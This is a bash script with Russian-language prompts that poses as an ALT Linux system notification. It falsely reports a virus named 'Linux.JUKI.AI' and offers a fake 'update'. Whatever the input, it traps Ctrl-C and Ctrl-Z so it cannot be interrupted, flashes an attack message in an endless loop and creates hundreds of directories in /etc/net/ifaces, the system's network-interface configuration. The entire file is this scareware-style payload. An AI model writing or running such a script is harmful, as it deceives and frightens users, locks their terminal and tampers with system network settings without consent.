#!/bin/bash

windows_style() {
    clear
    echo -e "\e[44m\e[97m╔══════════════════════════════════════════╗"
    echo "║               ALT LINUX                  ║"
    echo "║         Системное уведомление            ║"
    echo "╚══════════════════════════════════════════╝"
    echo ""
}
sleep 4

while true; do
    windows_style
    echo -e "\e[31mОбнаружен вирус: Linux.JUKI.AI"
    echo "Рекомендуется удалить или обновить ALT Linux"
    echo ""
    sleep 3
    echo "Нажмите:"
    echo "1 - Обновить Linux (рекомендуется)"
    
    read -p "Ваш выбор: " choice
    
    case $choice in
        1)
            clear
            echo "Запуск деинсталляции Linux"
            clear
            echo "Запуск деинсталляции Linux."
            clear
            echo "Запуск деинсталляции Linux.."
            clear
            echo "Запуск деинсталляции Linux..."
            clear
            sleep 3
            trap '' SIGINT SIGTSTP
            pip=0
            pop=60
            while [ $pip -lt 200 ]; do
                clear
                printf "\e[$(($(tput lines)/2));$(($(tput cols)/2-8))f\033[1;31m!!! JUKI ATAKUYUT VASH LINUX !!!\033[0m"
                sleep 0.5
                mkdir -p /etc/net/ifaces/test/empBs$pip
                pip=$((pip + 1))
                pop=$((pop - 1))
                clear
                sleep 0.3
            done
            ;;
            
        *)
            clear
            echo "Неверный ввод! Система нестабильна!"
            sleep 5
            trap '' SIGINT SIGTSTP
            pip=0
            pop=60
            while [ $pip -lt 300 ]; do
                clear
                printf "\e[$(($(tput lines)/2));$(($(tput cols)/2-8))f\033[1;31m!!! JUKI ATAKUYUT VASH LINUX !!!\033[0m"
                sleep 0.5
                mkdir -p /etc/net/ifaces/test/empBs$pip
                pip=$((pip + 1))
                pop=$((pop - 1))
                clear
                sleep 0.3
            done
            ;;
    esac
done
